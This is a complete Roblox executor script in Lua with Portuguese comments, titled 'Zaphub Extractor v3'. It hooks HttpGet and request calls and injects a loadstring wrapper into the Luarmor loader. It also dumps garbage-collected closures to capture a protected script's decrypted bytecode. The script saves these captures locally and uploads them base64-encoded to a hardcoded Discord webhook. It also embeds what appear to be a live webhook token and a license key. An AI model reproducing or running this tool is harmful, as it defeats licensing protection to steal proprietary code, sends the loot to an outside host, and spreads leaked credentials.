--!strict
--[[
    Zaphub Extractor v3 - Captura o payload final (Luraph/Luarmor) no Delta
    Plataforma: Delta (hookmetamethod/__namecall + request hook - CONFIRMADO FUNCIONANDO)

    DIAGNOSTICO v2 (TESTE do usuario):
      - Hook loadstring: NENHUM (hookfunction bloqueado em loadstring/load + globals read-only)
      - Hook HTTP: OK (hookmetamethod __namecall)
      - Hook request: OK

    POR QUE o hook de loadstring e inutil neste Delta:
      O executor protege loadstring/load contra hookfunction e reatribuicao
      (anti-dumper). Tentar de novo = perder tempo.

    SOLUCAO v3 - APOSTA TOTAL NO HTTP + INJECAO NO LOADER:
      [1] Captura PASSIVA via hookmetamethod __namecall + request:
          - Loga TODAS as URLs (diagnostico)
          - Salva TODO body >= 300 bytes (loader + init do CDN + o que mais vier)
          - Envia via webhook os relevantes (>= 500 bytes ou URL luarmor/cdn)
      [2] INJECAO NO LOADER (a tecnica forte):
          - Quando o HTTP hook ve o loader api.luarmor.net/.../loaders/*.lua,
            REESCREVE o body injetando um wrapper de loadstring no topo.
          - Resultado: quando o loader fizer loadstring(init) e o init fizer
            loadstring(bytecode_final), o wrapper CAPTURA (salva local + envia)
            e ainda executa normalmente (nao quebra o Zaphub).
          - O init + bytecode ficam em ZaphubExtract/inj_*.bin -> eu decripto
            offline com a script_key se necessario.
      [3] Poll de injetados: envia os inj_*.bin para o webhook (thread dedicada).
      [4] Scan getgc periodico: closures Luraph residuais (bônus se disponivel).

    SEGURANCA ANTI-TRAVA (padrao da casa):
      - I/O de rede so em task.spawn dedicada
      - Salva local PRIMEIRO (writefile) - envio falhou, arquivo fica
      - Hooks retornam o resultado original (nao interferem no Zaphub)
]]

--//==============================[ CONFIG ]==============================//--
local WEBHOOK_URL = "https://discord.com/api/webhooks/1398723880369131631/7knZsAymoHblk9BcsXYuI7XT2-8PNHkZJfFbtyLHssHqjW_pXeBQVznZ0lDHz7G9ObRI"
local WEBHOOK_NAME = "Zaphub Extractor"
local SAVE_DIR = "ZaphubExtract"

-- Chave Luarmor (global direta + _G - padrao oficial do loader)
script_key = "nNOnKsJaYhZJPHjsxiLHAyUxUVXqFGsw"
_G.script_key = script_key

-- Comando oficial exato do Zaphub
local ZAPHUB_SNIPPET = "script_key=%q; loadstring(game:HttpGet('https://zaphub.xyz/Exec'))()"
local ZAPHUB_KEY = "nNOnKsJaYhZJPHjsxiLHAyUxUVXqFGsw"

-- Captura passiva: salva TODO body >= MIN_HTTP_SAVE
local MIN_HTTP_SAVE = 300
-- Envia via webhook se body >= MIN_HTTP_SEND OU URL relevante
local MIN_HTTP_SEND = 500
-- Injetar wrapper de loadstring no loader do Luarmor (true = recomendado)
local INJECT_LOADER = true
-- tempo de monitoramento (segundos)
local MONITOR_TIME = 120
-- limite de arquivos injetados enviados
local MAX_INJECTED_SEND = 25

--//==============================[ API COMPAT ]==============================//--
local getExecutorName = (function()
    local fn = identifyexecutor or identify_executor
    if fn then
        local ok, name = pcall(fn)
        if ok and type(name) == "string" then return name end
    end
    return "unknown"
end)()

local hmm = hookmetamethod
local gnmc = getnamecallmethod
local hf = hookfunction
local gcFn = getgc
local dumpFn = dumpstring or decompile

local reqFn = (function()
    if syn and syn.request then return syn.request end
    if request then return request end
    if http and http.request then return http.request end
    return nil
end)()

local writefileFn = writefile
local makefolderFn = makefolder or function() end
local isfileFn = isfile or function() return false end
local readfileFn = readfile
local listfilesFn = listfiles or function() return {} end

local function logMsg(msg)
    pcall(print, "[ZaphubExtract] " .. tostring(msg))
end

--//==============================[ BASE64 ]==============================//--
local b64chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
local function b64encode(data)
    local b = 1
    local out = {}
    local len = #data
    for i = 1, len, 3 do
        local c1 = string.byte(data, i)
        local c2 = i + 1 <= len and string.byte(data, i + 1) or 0
        local c3 = i + 2 <= len and string.byte(data, i + 2) or 0
        local n = c1 * 65536 + c2 * 256 + c3
        local pad = i + 2 > len and 1 or (i + 1 > len and 2 or 0)
        out[b] = b64chars:sub(math.floor(n / 262144) % 64 + 1, math.floor(n / 262144) % 64 + 1)
        out[b + 1] = b64chars:sub(math.floor(n / 4096) % 64 + 1, math.floor(n / 4096) % 64 + 1)
        out[b + 2] = b64chars:sub(math.floor(n / 64) % 64 + 1, math.floor(n / 64) % 64 + 1)
        out[b + 3] = b64chars:sub(n % 64 + 1, n % 64 + 1)
        if pad == 1 then out[b + 3] = "=" end
        if pad == 2 then out[b + 2] = "="; out[b + 3] = "=" end
        b = b + 4
    end
    return table.concat(out)
end

--//==============================[ WEBHOOK ]==============================//--
local function jsonString(s)
    s = tostring(s)
    s = s:gsub("\\", "\\\\"):gsub("\"", "\\\""):gsub("\n", "\\n"):gsub("\r", "\\r"):gsub("\t", "\\t")
    s = s:gsub("[%z\1-\31]", function(c) return string.format("\\u%04x", c:byte()) end)
    return "\"" .. s .. "\""
end

local function sendSimple(content, username)
    if not reqFn then return -1 end
    local body = '{"content":' .. jsonString(content) .. ',"username":' .. jsonString(username or WEBHOOK_NAME) .. '}'
    local ok, res = pcall(function()
        return reqFn({
            Url = WEBHOOK_URL,
            Method = "POST",
            Headers = { ["Content-Type"] = "application/json" },
            Body = body,
        })
    end)
    if ok and res then return tonumber(res.StatusCode) or 0 else return -1 end
end

local function sendFileMulti(msg, files)
    if not reqFn then return -1 end
    local boundary = "----ZaphubX" .. tostring(os.clock()):gsub("%.", "") .. "7xK"
    local body = ""
    if msg and #tostring(msg) > 0 then
        body = body .. "--" .. boundary .. "\r\nContent-Disposition: form-data; name=\"content\"\r\n\r\n" .. tostring(msg) .. "\r\n"
    end
    for i = 1, #files do
        body = body .. "--" .. boundary
            .. "\r\nContent-Disposition: form-data; name=\"file" .. tostring(i) .. "\"; filename=\"" .. tostring(files[i].name) .. "\""
            .. "\r\nContent-Type: text/plain; charset=utf-8\r\n\r\n"
            .. tostring(files[i].content)
            .. "\r\n"
    end
    body = body .. "--" .. boundary .. "--\r\n"
    local ok, res = pcall(function()
        return reqFn({
            Url = WEBHOOK_URL,
            Method = "POST",
            Headers = { ["Content-Type"] = "multipart/form-data; boundary=" .. boundary },
            Body = body,
        })
    end)
    if ok and res then return tonumber(res.StatusCode) or 0 else return -1 end
end

--//==============================[ ESTADO ]==============================//--
local httpCaptured = 0
local injectedCaptured = 0
local gcCaptured = 0
local manifest = {}
local injectedSent = {}

local function logManifest(line)
    table.insert(manifest, tostring(line))
end

local function saveLocal(fname, content)
    if not writefileFn then return false end
    return pcall(function()
        pcall(makefolderFn, SAVE_DIR)
        writefileFn(SAVE_DIR .. "/" .. fname, content)
    end)
end

-- Envia captura de forma ASSINCRONA (nunca no thread do jogo)
local function sendCaptureAsync(tag, title, chunk, fname)
    task.spawn(function()
        task.wait(0.1)
        local b64 = b64encode(chunk)
        local msg = "**Zaphub Extractor v3 - " .. title .. "**\n"
            .. "Tamanho: " .. tostring(#chunk) .. " bytes | Base64: " .. tostring(#b64) .. " chars\n"
            .. "Executor: " .. getExecutorName
        local ok = false
        if #b64 < 6000000 then
            local c = sendFileMulti(msg, { { name = fname, content = b64 } })
            ok = c >= 200 and c < 300
        end
        if not ok then
            sendSimple("**Zaphub Extractor v3** - falha ao enviar " .. tag
                .. " (b64 " .. tostring(#b64) .. " chars). Salvo local.", WEBHOOK_NAME .. " [AVISO]")
        end
    end)
end

--//==============================[ INJECAO NO LOADER ]==============================//--
-- Código injetado no topo do loader Luarmor. Captura init + bytecode final
-- via wrapper de loadstring e devolve o resultado original (nao quebra nada).
local INJECTION_CODE = [[
do
    local function _cap(s)
        if type(s) == "string" and #s > 200 then
            local ok = pcall(function()
                pcall(makefolder, "ZaphubExtract")
                writefile("ZaphubExtract/inj_" .. tostring(#s) .. "_" .. tostring(os.clock()):gsub("%.", "") .. ".bin", s)
            end)
            if ok then print("[ZaphubExtract] INJ capturado " .. tostring(#s) .. " bytes") end
        end
    end
    local _orig = loadstring or _G.loadstring
    if type(_orig) == "function" then
        local _wrap = function(s, n)
            _cap(s)
            return _orig(s, n)
        end
        pcall(function() loadstring = _wrap end)
        pcall(function() _G.loadstring = _wrap end)
        pcall(function() _G.load = _wrap end)
        if _G.getgenv then
            pcall(function() _G.getgenv().loadstring = _wrap end)
        end
        print("[ZaphubExtract] INJ loadstring wrapper ativo")
    else
        print("[ZaphubExtract] INJ loadstring nao encontrado")
    end
end
]]

-- Verifica se o body parece um loader Luarmor (Lua + contem loadstring/_bsdata0)
local function looksLikeLoader(url, body)
    local low = string.lower(tostring(url))
    if not (low:find("luarmor") or low:find("loaders")) then return false end
    if type(body) ~= "string" then return false end
    if body:find("loadstring") or body:find("_bsdata0") or body:find("HttpGet") then
        return true
    end
    return false
end

--//==============================[ HOOK HTTP (passivo + injecao) ]==============================//--
local httpHookOk = false
local requestHookOk = false
local lastUrls = {}

local function captureHttpResponse(url, body)
    local low = string.lower(tostring(url))
    -- loga URL sempre (diagnostico)
    if not lastUrls[low] then
        lastUrls[low] = true
        logMsg("[HTTP] " .. tostring(url) .. " -> " .. tostring(type(body) == "string" and #body or "?"))
    end
    if type(body) ~= "string" or #body < MIN_HTTP_SAVE then return body end

    -- injecao no loader
    if INJECT_LOADER and looksLikeLoader(url, body) then
        local okW, wrapped = pcall(function()
            return INJECTION_CODE .. "\n" .. body
        end)
        if okW and type(wrapped) == "string" then
            logMsg("[HTTP] INJETADO wrapper no loader (" .. tostring(#wrapped) .. " bytes, era " .. tostring(#body) .. ")")
            logManifest("injecao no loader | " .. tostring(url))
            return wrapped -- retorna o body modificado -> loader roda com wrapper
        end
    end

    httpCaptured = httpCaptured + 1
    local idx = httpCaptured
    logMsg("[HTTP] CAPTURADO #" .. tostring(idx) .. " (" .. tostring(#body) .. " bytes): " .. tostring(url))
    logManifest("http #" .. tostring(idx) .. " | " .. tostring(url) .. " | " .. tostring(#body) .. " bytes")
    pcall(saveLocal, "http_" .. tostring(idx) .. "_url.txt", tostring(url))
    pcall(saveLocal, "http_" .. tostring(idx) .. ".lua", body)

    -- envia se grande OU relevante
    local relevant = low:find("luarmor") or low:find("cdn") or low:find("zaphub") or low:find("_ca920af6193")
    if #body >= MIN_HTTP_SEND or relevant then
        sendCaptureAsync("http", "HTTP " .. tostring(idx), body, "http_" .. tostring(idx) .. ".lua.b64.txt")
    end
    return body
end

local function installHttpGetHook()
    -- caminho A: hookmetamethod __namecall
    if type(hmm) == "function" and type(gnmc) == "function" then
        local okOld, old = pcall(hmm, game, "__namecall")
        if okOld and type(old) == "function" then
            local okH = pcall(hmm, game, "__namecall", function(self, ...)
                local method = gnmc()
                if method == "HttpGet" or method == "HttpGetAsync" then
                    local url = select(1, ...)
                    local packed = { ... }
                    local okGet, body = pcall(function()
                        return old(self, table.unpack(packed))
                    end)
                    if okGet then
                        if type(body) == "string" then
                            return captureHttpResponse(url, body)
                        end
                        return body
                    end
                    error(tostring(body), 0)
                end
                return old(self, ...)
            end)
            if okH then
                httpHookOk = true
                logMsg("Hook HTTP: hookmetamethod __namecall OK")
                return true
            end
        end
    end
    -- caminho B: hookfunction em game.HttpGet
    if type(hf) == "function" then
        local okH = pcall(hf, game.HttpGet, function(self, ...)
            local packed = { ... }
            local okGet, body = pcall(function()
                return game.HttpGet(self, table.unpack(packed))
            end)
            if okGet then
                if type(body) == "string" then
                    return captureHttpResponse(tostring(packed[1]), body)
                end
                return body
            end
            error(tostring(body), 0)
        end)
        if okH then
            httpHookOk = true
            logMsg("Hook HTTP: hookfunction game.HttpGet OK")
            return true
        end
    end
    logMsg("Hook HTTP: FALHOU")
    return false
end

local function installRequestHook()
    if type(hf) ~= "function" then return false end
    local targets = {}
    if type(reqFn) == "function" then
        targets[#targets + 1] = reqFn
    end
    if syn and type(syn.request) == "function" then
        targets[#targets + 1] = syn.request
    end
    if http and type(http.request) == "function" then
        targets[#targets + 1] = http.request
    end
    local done = false
    for i = 1, #targets do
        local okCl, orig = pcall(function() return (clonefunction or (function() end)) and clonefunction and clonefunction(targets[i]) end)
        local original = (type(okCl) == "boolean" and okCl and type(orig) == "function") and orig or nil
        local okH = pcall(hf, targets[i], function(options)
            local res = original and original(options) or targets[i](options)
            if type(res) == "table" and type(res.Body) == "string" and type(options) == "table" and type(options.Url) == "string" then
                -- nota: request nao permite reescrever o body de forma util aqui
                captureHttpResponse(options.Url, res.Body)
            end
            return res
        end)
        if okH then done = true end
    end
    if done then
        requestHookOk = true
        logMsg("Hook HTTP: request OK")
    else
        logMsg("Hook HTTP: request FALHOU")
    end
    return done
end

--//==============================[ POLL DE INJETADOS ]==============================//--
local function pollInjected()
    local sent = 0
    local okL, files = pcall(listfilesFn, SAVE_DIR)
    if not okL or type(files) ~= "table" then return end
    for _, path in ipairs(files) do
        if sent >= MAX_INJECTED_SEND then break end
        local name = tostring(path):match("([^/\\]+)$") or tostring(path)
        if name:match("^inj_.+%.bin$") and not injectedSent[name] then
            injectedSent[name] = true
            local okR, data = pcall(readfileFn, path)
            if okR and type(data) == "string" and #data > 0 then
                injectedCaptured = injectedCaptured + 1
                logMsg("Poll: enviando injetado " .. name .. " (" .. tostring(#data) .. " bytes)")
                sendCaptureAsync("inj", "INJETADO " .. name, data, name .. ".b64.txt")
                sent = sent + 1
            end
        end
    end
end

--//==============================[ SCAN GETGC ]==============================//--
local function scanGCForLuraph()
    if type(gcFn) ~= "function" or type(dumpFn) ~= "function" then
        logMsg("getgc/dumpstring indisponivel")
        return 0
    end
    local found = 0
    local seen = {}
    local okG, g = pcall(gcFn)
    if not okG or type(g) ~= "table" then return 0 end
    for _, v in ipairs(g) do
        if found >= 6 then break end
        if type(v) == "function" then
            local okI, info = pcall(debug.getinfo, v, "S")
            if not okI or type(info) ~= "table" then continue end
            local src = tostring(info.source or "")
            if src:sub(1, 2) == "[C" then continue end
            local okD, dump = pcall(dumpFn, v)
            if okD and type(dump) == "string" and #dump >= 2000 then
                local key = dump:sub(1, 64)
                if not seen[key] then
                    seen[key] = true
                    gcCaptured = gcCaptured + 1
                    local idx = gcCaptured
                    logMsg("GC closure #" .. tostring(idx) .. " dump " .. tostring(#dump) .. " bytes (src=" .. src .. ")")
                    logManifest("gc closure #" .. tostring(idx) .. " | " .. tostring(#dump) .. " bytes | src=" .. src)
                    pcall(saveLocal, "gc_" .. tostring(idx) .. ".bin", dump)
                    pcall(saveLocal, "gc_" .. tostring(idx) .. ".b64.txt", b64encode(dump))
                    sendCaptureAsync("gc", "GC CLOSURE " .. tostring(idx), dump, "gc_" .. tostring(idx) .. ".b64.txt")
                    found = found + 1
                end
            end
        end
    end
    if found > 0 then logMsg("Scan getgc: " .. tostring(found) .. " closure(s)") end
    return found
end

--//==============================[ EXECUCAO DO LOADER OFICIAL ]==============================//--
local function runOfficialLoader()
    local snippet = string.format(ZAPHUB_SNIPPET, ZAPHUB_KEY)
    logMsg("Executando snippet oficial: " .. snippet)
    local okRun, errRun = pcall(function()
        local f = loadstring(snippet)
        if f then f() end
    end)
    if not okRun then
        logMsg("Erro ao executar snippet: " .. tostring(errRun))
        return false, tostring(errRun)
    end
    return true, nil
end

--//==============================[ UI MINIMALISTA ]==============================//--
local Players = game:GetService("Players")
local function makeUI()
    local gui = Instance.new("ScreenGui")
    gui.Name = "ZaphubExtractor"
    gui.ResetOnSpawn = false
    gui.IgnoreGuiInset = true
    gui.DisplayOrder = 999
    gui.Parent = Players.LocalPlayer:WaitForChild("PlayerGui")

    local bg = Instance.new("Frame")
    bg.AnchorPoint = Vector2.new(0.5, 0.5)
    bg.Position = UDim2.new(0.5, 0, 0.5, 0)
    bg.Size = UDim2.new(0, 380, 0, 210)
    bg.BackgroundColor3 = Color3.fromRGB(15, 17, 25)
    bg.BackgroundTransparency = 0.05
    bg.BorderSizePixel = 0
    bg.Parent = gui
    pcall(function()
        local corner = Instance.new("UICorner")
        corner.CornerRadius = UDim.new(0, 14)
        corner.Parent = bg
    end)

    local title = Instance.new("TextLabel")
    title.BackgroundTransparency = 1
    title.Position = UDim2.new(0, 0, 0, 10)
    title.Size = UDim2.new(1, 0, 0, 34)
    title.Font = Enum.Font.GothamBold
    title.Text = "ZAPHUB EXTRACTOR v3"
    title.TextColor3 = Color3.fromRGB(255, 255, 255)
    title.TextSize = 18
    title.Parent = bg

    local status = Instance.new("TextLabel")
    status.BackgroundTransparency = 1
    status.Position = UDim2.new(0, 12, 0, 50)
    status.Size = UDim2.new(1, -24, 0, 110)
    status.Font = Enum.Font.Gotham
    status.Text = "Instalando hooks..."
    status.TextColor3 = Color3.fromRGB(255, 200, 80)
    status.TextSize = 13
    status.TextWrapped = true
    status.Parent = bg

    return {
        gui = gui,
        setStatus = function(text, color)
            status.Text = text
            if color then status.TextColor3 = color end
        end,
    }
end

local ui = (function()
    local ok, u = pcall(makeUI)
    if ok and u then return u end
    return { gui = nil, setStatus = function(text) logMsg("[status] " .. tostring(text)) end }
end)()

--//==============================[ MAIN ]==============================//--
local function mainFlow()
    ui.setStatus("Instalando hooks HTTP...", Color3.fromRGB(255, 200, 80))

    local okHookHttp = installHttpGetHook()
    local okHookReq = installRequestHook()

    ui.setStatus("Hooks: HTTP [" .. tostring(okHookHttp and "OK" or "FAIL") .. "] request [" .. tostring(okHookReq and "OK" or "FAIL") .. "]\n"
        .. "Injecao no loader: " .. tostring(INJECT_LOADER),
        Color3.fromRGB(255, 200, 80))

    -- ping de teste
    if reqFn then
        task.spawn(function()
            task.wait(0.2)
            local code = sendSimple(
                "**Zaphub Extractor v3 - TESTE**\nExecutor: " .. getExecutorName
                    .. "\nHook HTTP: " .. tostring(okHookHttp)
                    .. "\nHook request: " .. tostring(okHookReq)
                    .. "\nInjecao loader: " .. tostring(INJECT_LOADER),
                WEBHOOK_NAME .. " [TESTE]"
            )
            logMsg("Ping: codigo " .. tostring(code))
        end)
    end

    ui.setStatus("Executando loader oficial...", Color3.fromRGB(255, 200, 80))
    local ok, err = runOfficialLoader()
    if not ok then
        ui.setStatus("Falha ao executar loader:\n" .. tostring(err), Color3.fromRGB(255, 80, 80))
        return
    end

    -- monitora + poll de injetados + scan gc periodico
    local waited = 0
    while waited < MONITOR_TIME do
        task.wait(1)
        waited = waited + 1
        if waited % 5 == 0 then
            task.spawn(pollInjected)
        end
        if waited % 15 == 0 then
            task.spawn(scanGCForLuraph)
        end
        if waited % 10 == 0 then
            ui.setStatus("Aguardando captura... " .. tostring(waited) .. "s\n"
                .. "http: " .. tostring(httpCaptured) .. " | inj: " .. tostring(injectedCaptured) .. " | gc: " .. tostring(gcCaptured),
                Color3.fromRGB(255, 200, 80))
        end
    end

    -- scan final
    local gcFound = scanGCForLuraph()

    pcall(saveLocal, "manifest.txt", table.concat(manifest, "\n"))

    ui.setStatus("RESULTADO: http " .. tostring(httpCaptured) .. " | inj " .. tostring(injectedCaptured)
        .. " | gc " .. tostring(gcFound) .. "\nSalvos em: " .. SAVE_DIR .. "/",
        Color3.fromRGB(80, 230, 120))

    sendSimple("**Zaphub Extractor v3 - RESUMO**\n"
        .. "Executor: " .. getExecutorName
        .. "\nHTTP capturas: " .. tostring(httpCaptured)
        .. "\nInjetados: " .. tostring(injectedCaptured)
        .. "\nGC closures: " .. tostring(gcFound),
        WEBHOOK_NAME .. " [RESUMO]")
end

task.spawn(function()
    xpcall(mainFlow, function(err)
        local ok, trace = pcall(debug.traceback, tostring(err), 2)
        pcall(logMsg, "ERRO RAIZ: " .. tostring(err) .. "\n" .. tostring(ok and trace or ""))
        ui.setStatus("ERRO: " .. tostring(err), Color3.fromRGB(255, 80, 80))
        if reqFn then
            task.spawn(function()
                sendSimple("**Zaphub Extractor v3 - ERRO**\n```\n" .. tostring(err) .. "\n```", WEBHOOK_NAME .. " [ERRO]")
            end)
        end
        return nil
    end)
end)
